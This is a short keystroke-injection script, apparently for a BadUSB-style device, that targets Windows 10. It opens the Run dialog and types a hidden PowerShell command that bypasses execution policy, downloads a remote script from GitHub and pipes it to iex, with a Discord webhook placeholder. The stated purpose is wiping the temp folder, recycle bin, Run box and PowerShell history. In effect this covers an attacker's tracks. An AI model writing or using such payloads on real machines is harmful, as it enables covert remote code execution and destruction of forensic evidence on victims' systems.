// Title: History Cleaner
// Author: @beigeworm
// Description: This script empties the temp folder and recycle bin, clear run box and powershell history
// Target: Windows 10

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C $dc='DISCORD_WEBHOOK_HERE'; irm https://raw.githubusercontent.com/beigeworm/PwnPi-Scripts/main/Fast-Execution/Clean-History/main.ps1 | iex");
delay(500);
press("ENTER");

